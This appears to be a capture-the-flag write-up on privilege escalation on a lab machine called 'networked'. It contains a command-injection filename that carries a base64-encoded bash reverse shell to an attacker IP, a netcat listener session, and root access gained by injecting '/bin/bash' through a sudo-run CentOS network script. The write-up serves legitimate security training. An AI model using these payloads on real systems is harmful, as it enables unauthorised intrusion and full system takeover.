# Privilege Escalation

## Getting user: Guly
- In /home/check_attack.php, we can see a variable $var is being removed, which is a file name in /var/www/html/uploads
```php

...[snip]...

file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
  
...[snip]...

```
- Additionally the filename cannot have `/` in it.
- If we can get $var --> ` '; bash -c "bash -i  >& /dev/tcp/10.10.14.18/9002 0>&1" ' `, then we can get a reverse shell. The same payload as used before. But we can't have `/` in it, so we can convert it into base64 and decode it and execute it.
- So effectively the name of the file should be as such : `;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC85MDAyIDA+JjEiCg== | base64 -d | bash`
- Additionally, the crontab in /home/guly, gives us the information that this is executed as guly.
- Open a listener and we can get a reverse shell in a while.
```bash
nc -lnvp 9002                                                                                               
listening on [any] 9002 ...                                                                                     
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.146] 39284                                                    
bash: no job control in this shell                                                                              
[guly@networked ~]$ python -c 'import pty; pty.spawn("/bin/bash")'                                              
python -c 'import pty; pty.spawn("/bin/bash")'                                                                  
[guly@networked ~]$ ^Z                                                                                          
[1]  + 9349 suspended  nc -lnvp 9002                                                                            
```

## User: root
- After running `sudo -l`, we can see guly can execute changeme.sh as root, without any password
```bash
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh

```

- Checking the contents of changeme.sh
```bash
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0

```
- At the end ifup is being used to bring up a netwrok interface: guly0.
- There is a [blog](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f) post regarding CentOS bug, where a regular user with a permission to execute a network script can escalate privileges.
- The user has to pass `\<anything\> \<cmd\>` in any of the user provided parameter.
```bash
[guly@networked network-scripts]$ sudo /usr/local/sbin/changename.sh
interface NAME:
sad
interface PROXY_METHOD:
sad /bin/bash
interface BROWSER_ONLY:
sad
interface BOOTPROTO:
sad
[root@networked network-scripts]# 

```
- Thus we can cat out the root.txt from /root.txt